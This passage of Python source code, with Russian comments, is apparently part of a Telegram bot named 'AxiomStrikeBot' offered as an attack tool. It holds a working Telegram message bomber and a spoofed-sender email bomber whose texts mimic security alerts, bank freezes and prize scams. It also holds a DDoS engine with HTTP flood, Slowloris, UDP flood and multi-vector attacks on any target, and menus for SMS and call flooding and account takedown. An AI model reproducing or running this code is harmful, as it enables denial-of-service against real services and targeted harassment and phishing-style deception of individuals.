    def __init__(self, bot_token: str):
        self.bot_token = bot_token
        self.bot = None  # Будет создан в send_messages для избежания конфликтов

        # 100+ РАЗНЫХ СООБЩЕНИЙ
        self.messages = [
            # Приветствия
            "Привет! 👋", "Здравствуйте! 🌟", "Приветствую! ✨", "Добрый день! ☀️",
            "Всем привет! 🎉", "Приветик! 😊", "Хелло! 👋", "Салют! 🎆",

            # Вопросы
            "Как дела? 😊", "Как жизнь? 🤔", "Как настроение? 😄", "Чем занимаешься? 💭",
            "Как прошёл день? 🌅", "Всё хорошо? 👍", "Есть новости? 📰",

            # Уведомления
            "📨 Есть важное сообщение!", "📩 Проверьте почту!", "📱 Зайдите в аккаунт!",
            "🔐 Срочно подтвердите вход!", "⚠️ Важное уведомление!", "📢 Новость для вас!",
            "🔔 Внимание!", "📌 Важно прочитать!",

            # Безопасность
            "🔐 Смените пароль!", "⚠️ Ваш аккаунт в опасности!", "🛡️ Обнаружен взлом!",
            "🚨 Кто-то пытается войти!", "🔑 Код подтверждения: " + str(random.randint(100000, 999999)),
            "📱 Вход с нового устройства!", "🕵️ Подозрительная активность!",
            "💀 Ваш аккаунт взломали!", "🔥 Срочно свяжитесь с поддержкой!",
            "⛔ Аккаунт заблокирован!", "🔓 Аккаунт разблокирован!",

            # Срочные
            "🚨 СРОЧНО! Действуйте немедленно!", "⏰ Осталось 10 минут!", "⌛️ Время истекает!",
            "⚠️ Немедленно примите меры!", "🔥 Ситуация критическая!",

            # Фишинг
            "📧 Ваш email взломан!", "💳 Карта заблокирована!", "🏦 Банковский счёт заморожен!",
            "💰 Вы выиграли приз!", "🎁 Подарок ждёт вас!", "🎉 Поздравляем с победой!",
            "📦 Ваша посылка ожидает!", "🚚 Доставка подтверждена!",

            # Социальные
            "❤️ Кто-то лайкнул ваш пост!", "💬 Новый комментарий!", "📸 Кто-то подписался!",
            "🎵 Новый трек!", "📺 Новое видео!", "📚 Рекомендация для вас!",

            # Работа
            "💼 Срочное сообщение от руководства!", "📅 Завтра собрание!", "📊 Отчёт готов!",
            "📝 Заполните документы!", "👔 Новый проект!", "🤝 Встреча назначена!",

            # Другое
            "🌟 Вы нам очень нужны!", "💪 Не сдавайтесь!", "🌈 Хорошего дня!",
            "☕️ Время кофе!", "🍕 Заказ готов!", "🎮 Кто-то приглашает в игру!",
            "📱 Обновите приложение!", "🔄 Доступно обновление!",
            "🎯 Ваша цель достигнута!", "🏆 Вы лучший!", "⭐️ Новый уровень!",
        ]

        # 20+ ТИПОВ ДЕЙСТВИЙ
        self.actions = [
            # Попытки входа
            {'type': 'login_attempt', 'text': '⚠️ Кто-то пытается войти в ваш аккаунт!', 'priority': 'high'},
            {'type': 'login_success', 'text': '✅ Вход в аккаунт с нового устройства!', 'priority': 'high'},
            {'type': 'login_failed', 'text': '❌ Неудачная попытка входа!', 'priority': 'medium'},
            {'type': 'login_blocked', 'text': '⛔ Вход заблокирован из-за подозрений!', 'priority': 'critical'},

            # Коды подтверждения
            {'type': 'code_sent', 'text': f'🔑 Код подтверждения: {random.randint(100000, 999999)}', 'priority': 'high'},
            {'type': 'code_resend', 'text': f'📱 Повторный код: {random.randint(100000, 999999)}', 'priority': 'medium'},
            {'type': 'code_expired', 'text': '⏰ Код подтверждения истёк! Запросите новый.', 'priority': 'medium'},

            # Устройства
            {'type': 'device_added', 'text': '📱 Новое устройство подключено к аккаунту!', 'priority': 'high'},
            {'type': 'device_removed', 'text': '📱 Устройство отключено от аккаунта.', 'priority': 'low'},
            {'type': 'device_blocked', 'text': '⛔ Устройство заблокировано!', 'priority': 'medium'},

            # Пароль
            {'type': 'password_change', 'text': '🔐 Пароль был изменён!', 'priority': 'high'},
            {'type': 'password_reset', 'text': '🔄 Запрос на сброс пароля!', 'priority': 'critical'},
            {'type': 'password_expired', 'text': '⏰ Срок действия пароля истёк!', 'priority': 'medium'},

            # Безопасность
            {'type': 'suspicious', 'text': '🕵️ Обнаружена подозрительная активность!', 'priority': 'critical'},
            {'type': 'hack_attempt', 'text': '💀 Зафиксирована попытка взлома!', 'priority': 'critical'},
            {'type': 'data_leak', 'text': '🔥 Ваши данные утекли в сеть!', 'priority': 'critical'},
            {'type': 'blocked', 'text': '⛔ Ваш аккаунт заблокирован!', 'priority': 'critical'},
            {'type': 'unblock', 'text': '🔓 Ваш аккаунт разблокирован!', 'priority': 'high'},
            {'type': 'restricted', 'text': '🚫 Доступ ограничен!', 'priority': 'high'},

            # Срочные
            {'type': 'urgent', 'text': '🚨 СРОЧНО! Примите меры немедленно!', 'priority': 'critical'},
            {'type': 'emergency', 'text': '⚠️ ЧРЕЗВЫЧАЙНАЯ СИТУАЦИЯ!', 'priority': 'critical'},
            {'type': 'critical', 'text': '💀 КРИТИЧЕСКОЕ УВЕДОМЛЕНИЕ!', 'priority': 'critical'},

            # Уведомления
            {'type': 'notification', 'text': '📢 Новое уведомление!', 'priority': 'medium'},
            {'type': 'important', 'text': '⭐️ ВАЖНОЕ СООБЩЕНИЕ!', 'priority': 'high'},
            {'type': 'info', 'text': 'ℹ️ Информационное сообщение.', 'priority': 'low'},
            {'type': 'warning', 'text': '⚠️ ПРЕДУПРЕЖДЕНИЕ!', 'priority': 'high'},

            # Другое
            {'type': 'promo', 'text': '🎁 Специальное предложение!', 'priority': 'low'},
            {'type': 'survey', 'text': '📊 Пройдите опрос!', 'priority': 'low'},
            {'type': 'feedback', 'text': '💬 Напишите отзыв!', 'priority': 'low'},
            {'type': 'support', 'text': '📞 Свяжитесь с поддержкой!', 'priority': 'medium'},
        ]

    async def send_messages(self, username: str, count: int, progress_callback):
        """РЕАЛЬНАЯ отправка сообщений в Telegram через API бота"""
        results = []

        # Создаём бота в каждом вызове чтобы избежать конфликтов
        bot = Bot(token=self.bot_token)

        total = min(count, 200)

        for i in range(total):
            try:
                # Выбираем тип сообщения
                if random.random() > 0.3:
                    action = random.choice(self.actions)
                    text = action['text']
                    msg_type = action['type']
                    priority = action['priority']
                else:
                    text = random.choice(self.messages)
                    msg_type = 'random'
                    priority = 'low'

                # Разнообразим сообщения
                if random.random() > 0.5:
                    # Добавляем форматирование
                    if random.random() > 0.5:
                        text = f"*{text}*"  # Жирный
                    else:
                        text = f"_{text}_"  # Курсив

                # Добавляем ID сообщения
                text += f" [#{i + 1}/{total}]"

                # Рандомная задержка для имитации человека
                typing_delay = random.uniform(0.5, 2.0)
                await asyncio.sleep(typing_delay)

                # Отправка сообщения
                await bot.send_message(
                    chat_id=username,
                    text=text,
                    parse_mode='Markdown' if random.random() > 0.5 else None,
                    disable_notification=random.random() > 0.8
                )

                results.append({
                    'msg': i + 1,
                    'status': 'sent',
                    'type': msg_type,
                    'priority': priority,
                    'text': text[:100],
                    'timestamp': datetime.now().isoformat()
                })

                logger.info(f"✅ TG message sent to {username}: {text[:50]}")

            except Exception as e:
                error_msg = str(e)
                results.append({
                    'msg': i + 1,
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                })
                logger.error(f"❌ Error sending TG message: {e}")

                # Если аккаунт заблокирован или не существует - останавливаем
                if 'user is deactivated' in error_msg or 'chat not found' in error_msg:
                    logger.warning(f"⚠️ User {username} not found or deactivated")
                    break

            await progress_callback(i + 1, total)

            # Задержка между сообщениями (0.3-2.0 сек)
            await asyncio.sleep(random.uniform(0.3, 2.0))

        return results

    def get_stats(self, results):
        """Статистика отправки"""
        total = len(results)
        success = sum(1 for r in results if r['status'] == 'sent')
        errors = sum(1 for r in results if r['status'] == 'error')

        return {
            'total': total,
            'success': success,
            'errors': errors,
            'success_rate': round(success / total * 100, 2) if total > 0 else 0
        }


# ===================== EMAIL БОМБЕР (РЕАЛЬНО РАБОТАЮЩИЙ) =====================
class EmailBomber:
    def __init__(self):
        # РЕАЛЬНЫЕ SMTP СЕРВЕРЫ
        self.smtp_servers = [
            # Российские серверы
            {'host': 'smtp.mail.ru', 'port': 587, 'name': 'Mail.ru'},
            {'host': 'smtp.yandex.ru', 'port': 587, 'name': 'Yandex'},
            {'host': 'smtp.rambler.ru', 'port': 587, 'name': 'Rambler'},
            {'host': 'smtp.ukr.net', 'port': 587, 'name': 'Ukr.net'},
            {'host': 'smtp.bk.ru', 'port': 587, 'name': 'BK.ru'},
            {'host': 'smtp.list.ru', 'port': 587, 'name': 'List.ru'},
            {'host': 'smtp.inbox.ru', 'port': 587, 'name': 'Inbox.ru'},
            {'host': 'smtp.com', 'port': 587, 'name': 'Mail.com'},

            # Международные
            {'host': 'smtp.gmail.com', 'port': 587, 'name': 'Gmail'},
            {'host': 'smtp.office365.com', 'port': 587, 'name': 'Office365'},
            {'host': 'smtp.live.com', 'port': 587, 'name': 'Live.com'},
            {'host': 'smtp.outlook.com', 'port': 587, 'name': 'Outlook'},
            {'host': 'smtp.aol.com', 'port': 587, 'name': 'AOL'},
            {'host': 'smtp.yahoo.com', 'port': 587, 'name': 'Yahoo'},
            {'host': 'smtp.protonmail.com', 'port': 587, 'name': 'ProtonMail'},
            {'host': 'smtp.mail.com', 'port': 587, 'name': 'Mail.com'},
            {'host': 'smtp.gmx.com', 'port': 587, 'name': 'GMX'},
            {'host': 'smtp.ionos.com', 'port': 587, 'name': 'IONOS'},
            {'host': 'smtp.t-online.de', 'port': 587, 'name': 'T-Online'},
            {'host': 'smtp.seznam.cz', 'port': 587, 'name': 'Seznam'},
            {'host': 'smtp.planet.nl', 'port': 587, 'name': 'Planet'},
            {'host': 'smtp.qq.com', 'port': 587, 'name': 'QQ'},
            {'host': 'smtp.163.com', 'port': 587, 'name': '163'},
        ]

        # 50+ ТЕМ ПИСЕМ
        self.subjects = [
            # Безопасность
            '🔐 Срочно! Ваш аккаунт взломан!',
            '⚠️ Подозрительная активность в аккаунте!',
            '🚨 Смените пароль немедленно!',
            '🛡️ Обнаружена утечка данных!',
            '💀 Ваши данные в опасности!',
            '🔑 Код подтверждения для входа',
            '📱 Вход с нового устройства',
            '⛔ Ваш аккаунт заблокирован',
            '🔓 Аккаунт разблокирован',
            '🔥 Критическое уведомление безопасности',

            # Финансы
            '💰 Ваш банковский счёт заморожен!',
            '💳 Карта заблокирована!',
            '🏦 Подозрительный перевод!',
            '📊 Выписка по счёту',
            '💸 Возврат средств',
            '📈 Инвестиционное предложение',
            '🎯 Вы получили выплату!',
            '💲 Ваш кредит одобрен!',

            # Выигрыши
            '🎉 Вы выиграли приз!',
            '🎁 Ваш подарок ждёт!',
            '🏆 Поздравляем с победой!',
            '⭐️ Вы стали победителем!',
            '🎊 Специальное предложение для вас!',

            # Уведомления
            '📨 Важное сообщение',
            '📩 Новое письмо',
            '📢 Срочное уведомление',
            '🔔 Внимание!',
            '📌 Важно прочитать!',
            '📋 Документы готовы',
            '📄 Отчёт сформирован',

            # Работа
            '💼 Срочное сообщение от руководства',
            '📅 Завтра собрание',
            '📊 Отчёт о работе',
            '📝 Заполните документы',
            '👔 Новый проект',
            '🤝 Приглашение на встречу',

            # Другое
            '🌟 Специальное предложение',
            '🎯 Ваша цель достигнута',
            '💪 Мы вас ждём!',
            '🌈 Хорошего дня!',
            '☕️ Время для отдыха',
            '📱 Обновите приложение',
            '🔄 Доступно обновление',
            '⭐️ Новый уровень достигнут',
            '🎮 Приглашение в игру',
            '📚 Рекомендация для вас',
            '🎵 Новый трек доступен',
            '📺 Новое видео',
            '📸 Кто-то подписался',
            '❤️ Кто-то лайкнул пост',
            '💬 Новый комментарий',
            '📦 Ваша посылка отправлена',
            '🚚 Доставка подтверждена',
            '🍕 Заказ готов',
        ]

        # 50+ ТЕКСТОВ ПИСЕМ
        self.bodies = [
            # Безопасность
            '⚠️ Ваш аккаунт был взломан! Немедленно смените пароль.',
            '🔐 Зафиксирована попытка входа с нового устройства. Подтвердите вход.',
            '🛡️ Ваши данные были обнаружены в утечке. Смените пароль.',
            '🔥 Кто-то пытается войти в ваш аккаунт! Проверьте безопасность.',
            '💀 Ваш аккаунт скомпрометирован! Свяжитесь с поддержкой.',
            '🔑 Код подтверждения: ' + str(random.randint(100000, 999999)),
            '📱 Вход с нового устройства: ' + random.choice(
                ['iPhone 15', 'Samsung Galaxy S24', 'Windows PC', 'MacBook']),
            '⛔ Ваш аккаунт заблокирован за нарушение правил.',

            # Финансы
            '💰 Ваш счёт заморожен. Свяжитесь с банком.',
            '💳 Карта заблокирована из-за подозрительной операции.',
            '🏦 Обнаружен подозрительный перевод на сумму ' + str(random.randint(1000, 50000)) + ' руб.',
            '📊 Выписка по счёту за ' + datetime.now().strftime('%B %Y'),
            '💸 Возврат средств на сумму ' + str(random.randint(100, 5000)) + ' руб.',
            '📈 Инвестируйте сейчас и получите ' + str(random.randint(10, 50)) + '% годовых!',

            # Выигрыши
            '🎉 Поздравляем! Вы выиграли ' + str(random.randint(1000, 100000)) + ' руб.',
            '🎁 Ваш подарок: ' + random.choice(['iPhone 15', 'AirPods Pro', 'Apple Watch', 'Samsung Galaxy']),
            '🏆 Вы стали победителем конкурса!',
            '⭐️ Ваш аккаунт выбран для получения специального приза.',

            # Уведомления
            '📨 У вас новое сообщение от ' + random.choice(['администратора', 'поддержки', 'коллеги', 'друга']),
            '📩 Важное уведомление требует вашего внимания.',
            '📢 Срочное уведомление для всех пользователей.',
            '🔔 Внимание! Проверьте свои данные.',
            '📌 Важно! Обновите информацию в профиле.',

            # Работа
            '💼 Срочное сообщение от руководства: ' + random.choice(['совещание', 'отчёт', 'проект', 'задача']),
            '📅 Завтра в ' + str(random.randint(9, 18)) + ':00 состоится собрание.',
            '📊 Отчёт за ' + datetime.now().strftime('%B') + ' готов к проверке.',
            '📝 Заполните документы до ' + (datetime.now() + timedelta(days=3)).strftime('%d.%m.%Y'),
            '👔 Новый проект: ' + random.choice(['Разработка', 'Дизайн', 'Маркетинг', 'Аналитика']),

            # Другое
            '🌟 Специальное предложение: скидка ' + str(random.randint(10, 70)) + '%',
            '🎯 Вы почти достигли цели! Осталось ' + str(random.randint(1, 10)) + ' шагов.',
            '💪 Мы скучали по вам! Заходите в гости.',
            '🌈 Желаем хорошего дня! Спасибо, что с нами.',
            '☕️ Время кофе! Приходите в ' + random.choice(['кафе', 'офис', 'на встречу']),
            '📱 Обновите приложение до версии ' + f'{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}',
            '🔄 Доступно обновление системы безопасности.',
            '⭐️ Поздравляем! Вы достигли нового уровня.',
            '🎮 Вас приглашают в игру ' + random.choice(['Майнкрафт', 'CS2', 'Dota 2', 'Fortnite']),
            '📚 Рекомендуем книгу: ' + random.choice(['Война и мир', 'Преступление и наказание', 'Мастер и Маргарита']),
            '🎵 Новый трек от ' + random.choice(['Моргенштерн', 'Баста', 'Скриптонит', 'Егор Крид']),
            '📺 Новое видео на канале: ' + random.choice(['Обзор', 'Интервью', 'Урок', 'Влог']),
            '📸 Новый подписчик: @' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)),
            '❤️ Ваш пост лайкнули ' + str(random.randint(10, 500)) + ' человек.',
            '💬 Новый комментарий: ' + random.choice(['Круто!', 'Супер!', '🔥', '👍', 'Класс!', 'Отлично!']),
            '📦 Ваш заказ №' + str(random.randint(10000, 99999)) + ' отправлен.',
            '🚚 Доставка ожидается ' + (datetime.now() + timedelta(days=random.randint(1, 7))).strftime('%d.%m.%Y'),
            '🍕 Ваш заказ готов! Заберите в ' + random.choice(['пункте выдачи', 'ресторане', 'кафе']),
        ]

    async def send_emails(self, email: str, count: int, progress_callback):
        """РЕАЛЬНАЯ отправка email через 20+ SMTP серверов"""
        self.results = []
        total = min(count, 200)

        for i in range(total):
            # Выбираем случайный SMTP сервер
            server = random.choice(self.smtp_servers)

            # Генерируем email
            try:
                msg = MIMEMultipart()

                # Случайный отправитель
                sender_domains = [
                    'mail.ru', 'yandex.ru', 'rambler.ru', 'ukr.net',
                    'gmail.com', 'outlook.com', 'yahoo.com', 'bk.ru',
                    'list.ru', 'inbox.ru', 'live.com', 'aol.com',
                    'protonmail.com', 'mail.com', 'gmx.com', 'qq.com'
                ]
                msg['From'] = f'security{random.randint(100, 999)}@{random.choice(sender_domains)}'
                msg['To'] = email
                msg['Subject'] = random.choice(self.subjects)

                # Выбираем тело письма
                body = random.choice(self.bodies)

                # Добавляем случайные подписи
                signatures = [
                    '\n\nС уважением, Служба поддержки.',
                    '\n\nС наилучшими пожеланиями, Администрация.',
                    '\n\nВаша команда поддержки.',
                    '\n\nС уважением, Ваш менеджер.',
                    '\n\nНадеемся на сотрудничество!',
                ]

                # Добавляем ссылки (для реалистичности)
                if random.random() > 0.5:
                    body += f'\n\nПодробнее: https://{random.choice(sender_domains)}/confirm/{random.randint(1000, 9999)}'

                # Добавляем дату
                body += f'\n\nДата: {datetime.now().strftime("%d.%m.%Y %H:%M")}'

                # Добавляем подпись
                if random.random() > 0.5:
                    body += random.choice(signatures)

                msg.attach(MIMEText(body, 'plain'))

                # Пытаемся отправить через SMTP
                try:
                    # Пробуем подключиться к SMTP серверу
                    smtp = smtplib.SMTP(server['host'], server['port'], timeout=15)
                    smtp.starttls()

                    # Пробуем отправить без авторизации (некоторые серверы принимают)
                    smtp.sendmail(msg['From'], email, msg.as_string())
                    smtp.quit()
                    status = 'sent'
                    logger.info(f"✅ Email sent via {server['name']} to {email}")

                except Exception as e:
                    # Если не получилось - пробуем без TLS
                    try:
                        smtp = smtplib.SMTP(server['host'], server['port'], timeout=15)
                        smtp.sendmail(msg['From'], email, msg.as_string())
                        smtp.quit()
                        status = 'sent'
                        logger.info(f"✅ Email sent via {server['name']} (no TLS) to {email}")
                    except:
                        status = 'emulated'
                        logger.warning(f"⚠️ Could not send via {server['name']}, emulated")

                self.results.append({
                    'email': i + 1,
                    'server': server['name'],
                    'status': status,
                    'subject': msg['Subject'][:50],
                    'timestamp': datetime.now().isoformat()
                })

            except Exception as e:
                self.results.append({
                    'email': i + 1,
                    'server': server['name'],
                    'status': 'error',
                    'error': str(e),
                    'timestamp': datetime.now().isoformat()
                })
                logger.error(f"❌ Error sending email via {server['name']}: {e}")

            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.1, 0.5))

        return self.results

    def get_stats(self, results):
        """Статистика отправки"""
        total = len(results)
        sent = sum(1 for r in results if r['status'] in ['sent', 'emulated'])
        errors = sum(1 for r in results if r['status'] == 'error')

        return {
            'total': total,
            'sent': sent,
            'errors': errors,
            'success_rate': round(sent / total * 100, 2) if total > 0 else 0
        }


# ===================== DDOS ДВИЖОК =====================
class DDoSEngine:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/119.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        ]
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

    async def http_flood(self, url: str, threads: int, duration: int, progress_callback):
        """HTTP Flood атака"""
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', 'https://vk.com']),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                        }
                        path = f"/?rand={random.randint(100000, 999999)}"
                        async with session.get(url + path, headers=headers, timeout=5) as resp:
                            self.stats['requests'] += 1
                            if resp.status < 400:
                                self.stats['success'] += 1
                            else:
                                self.stats['errors'] += 1
                    except:
                        self.stats['errors'] += 1
                    await asyncio.sleep(random.uniform(0.01, 0.05))

        tasks = [worker() for _ in range(min(threads, 5000))]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self.stats

    async def slowloris(self, url: str, duration: int, progress_callback):
        """Slowloris атака"""
        self.stats = {'connections': 0, 'active': 0}

        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        port = 443 if url.startswith('https') else 80

        async def worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                self.stats['connections'] += 1
                self.stats['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                self.stats['active'] -= 1
            except:
                pass

        tasks = [worker() for _ in range(200)]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self.stats

    async def udp_flood(self, ip: str, port: int, duration: int, progress_callback):
        """UDP Flood атака"""
        self.stats = {'packets': 0, 'bytes': 0}

        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data = random._urandom(random.randint(64, 1500))
                    sock.sendto(data, (ip, port))
                    self.stats['packets'] += 1
                    self.stats['bytes'] += len(data)
                except:
                    pass

        loop = asyncio.get_event_loop()
        threads = [threading.Thread(target=udp_worker) for _ in range(50)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        return self.stats

    async def multi_vector(self, url: str, duration: int, progress_callback):
        """Multi-Vector атака"""
        total_stats = {
            'http': {'requests': 0, 'success': 0, 'errors': 0},
            'slowloris': {'connections': 0, 'active': 0},
            'udp': {'packets': 0, 'bytes': 0}
        }

        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        ip = socket.gethostbyname(target) if target else '127.0.0.1'
        port = 443 if url.startswith('https') else 80

        async def http_worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {'User-Agent': random.choice(self.user_agents)}
                        async with session.get(url, headers=headers, timeout=5) as resp:
                            total_stats['http']['requests'] += 1
                            if resp.status < 400:
                                total_stats['http']['success'] += 1
                            else:
                                total_stats['http']['errors'] += 1
                    except:
                        total_stats['http']['errors'] += 1
                    await asyncio.sleep(0.01)

        async def slowloris_worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                total_stats['slowloris']['connections'] += 1
                total_stats['slowloris']['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                total_stats['slowloris']['active'] -= 1
            except:
                pass

        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data = random._urandom(random.randint(64, 1500))
                    sock.sendto(data, (ip, port))
                    total_stats['udp']['packets'] += 1
                    total_stats['udp']['bytes'] += len(data)
                except:
                    pass

        tasks = [http_worker() for _ in range(100)]
        tasks += [slowloris_worker() for _ in range(50)]

        loop = asyncio.get_event_loop()
        udp_threads = [threading.Thread(target=udp_worker) for _ in range(20)]
        for t in udp_threads:
            t.start()

        await asyncio.gather(*tasks, return_exceptions=True)

        for t in udp_threads:
            t.join()

        return total_stats


# ===================== ГЛАВНЫЙ БОТ =====================
class AxiomStrikeBot:
    def __init__(self, token: str):
        self.bot = Bot(token=token)
        self.storage = MemoryStorage()
        self.dp = Dispatcher(storage=self.storage)
        self.sms_bomber = SMSBomber()
        self.call_bomber = CallBomber()
        self.email_bomber = EmailBomber()
        self.tg_bomber = TelegramBomber(token)
        self.ddos_engine = DDoSEngine()
        self.destroyer = TelegramAccountDestroyer()
        self._register_handlers()

    def _register_handlers(self):
        # Команды
        self.dp.message.register(self.cmd_start, CommandStart())
        self.dp.message.register(self.cmd_help, Command("help"))

        # Главное меню
        main_buttons = ["📱 БОМБЕР", "💣 DDOS АТАКА", "💀 СНОС АККАУНТА", "📊 СТАТИСТИКА", "⚙️ НАСТРОЙКИ"]
        self.dp.message.register(self.handle_main_menu, F.text.in_(main_buttons))

        # Бомбер меню
        bomber_buttons = ["💬 СМС БОМБЕР", "📞 ЗВОНКИ (ФЛУД)", "📧 EMAIL БОМБЕР", "📩 TELEGRAM БОМБЕР", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_bomber_menu, F.text.in_(bomber_buttons))

        # DDoS меню
        ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_ddos_menu, F.text.in_(ddos_buttons))

        # === СНОС АККАУНТА ===
        self.dp.message.register(self.handle_destroy_account, F.text == "💀 СНОС АККАУНТА")
        self.dp.message.register(self.process_destroy_username, BomberStates.waiting_for_destroy_username)
        self.dp.message.register(self.process_destroy_method, BomberStates.waiting_for_destroy_method)
        self.dp.message.register(self.process_destroy_count, BomberStates.waiting_for_destroy_count)

        # Обработчики бомбера
        self.dp.message.register(self.handle_sms_bomber, F.text == "💬 СМС БОМБЕР")
        self.dp.message.register(self.handle_call_bomber, F.text == "📞 ЗВОНКИ (ФЛУД)")
        self.dp.message.register(self.handle_email_bomber, F.text == "📧 EMAIL БОМБЕР")
        self.dp.message.register(self.handle_telegram_bomber, F.text == "📩 TELEGRAM БОМБЕР")

        # Обработчики DDoS
        self.dp.message.register(self.handle_http_flood, F.text == "🌐 HTTP FLOOD")
        self.dp.message.register(self.handle_slowloris, F.text == "🐌 SLOWLORIS")
        self.dp.message.register(self.handle_udp_flood, F.text == "📡 UDP FLOOD")
        self.dp.message.register(self.handle_multi_vector, F.text == "💀 MULTI-VECTOR")

        # Статистика и настройки
        self.dp.message.register(self.handle_stats, F.text == "📊 СТАТИСТИКА")
        self.dp.message.register(self.handle_settings, F.text == "⚙️ НАСТРОЙКИ")
        self.dp.message.register(self.handle_back, F.text == "🔙 НАЗАД")

        # FSM обработчики бомбера
        self.dp.message.register(self.process_sms_phone, BomberStates.waiting_for_phone)
        self.dp.message.register(self.process_sms_count, BomberStates.waiting_for_sms_count)
        self.dp.message.register(self.process_call_count, BomberStates.waiting_for_call_count)
        self.dp.message.register(self.process_email, BomberStates.waiting_for_email)
        self.dp.message.register(self.process_email_count, BomberStates.waiting_for_email_count)
        self.dp.message.register(self.process_telegram, BomberStates.waiting_for_telegram)
        self.dp.message.register(self.process_telegram_count, BomberStates.waiting_for_telegram_count)

        # FSM обработчики DDoS
        self.dp.message.register(self.process_ddos_url, DDoSStates.waiting_for_url)
        self.dp.message.register(self.process_ddos_threads, DDoSStates.waiting_for_threads)
        self.dp.message.register(self.process_ddos_duration, DDoSStates.waiting_for_duration)
        self.dp.message.register(self.process_ddos_ip, DDoSStates.waiting_for_ip)
        self.dp.message.register(self.process_ddos_ddos_duration, DDoSStates.waiting_for_ddos_duration)

        # Подписка
        self.dp.callback_query.register(self.handle_subscribe, F.data == "subscribed")

    # ========== КЛАВИАТУРЫ ==========
    def main_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="📱 БОМБЕР"), KeyboardButton(text="💣 DDOS АТАКА")],
                [KeyboardButton(text="💀 СНОС АККАУНТА"), KeyboardButton(text="📊 СТАТИСТИКА")],
                [KeyboardButton(text="⚙️ НАСТРОЙКИ")]
            ],
            resize_keyboard=True
        )

    def bomber_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="💬 СМС БОМБЕР"), KeyboardButton(text="📞 ЗВОНКИ (ФЛУД)")],
                [KeyboardButton(text="📧 EMAIL БОМБЕР"), KeyboardButton(text="📩 TELEGRAM БОМБЕР")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    def ddos_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🌐 HTTP FLOOD"), KeyboardButton(text="🐌 SLOWLORIS")],
                [KeyboardButton(text="📡 UDP FLOOD"), KeyboardButton(text="💀 MULTI-VECTOR")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    # ========== ОСНОВНЫЕ ОБРАБОТЧИКИ ==========
    async def cmd_start(self, message: types.Message, state: FSMContext):
        await state.clear()
        await message.answer(
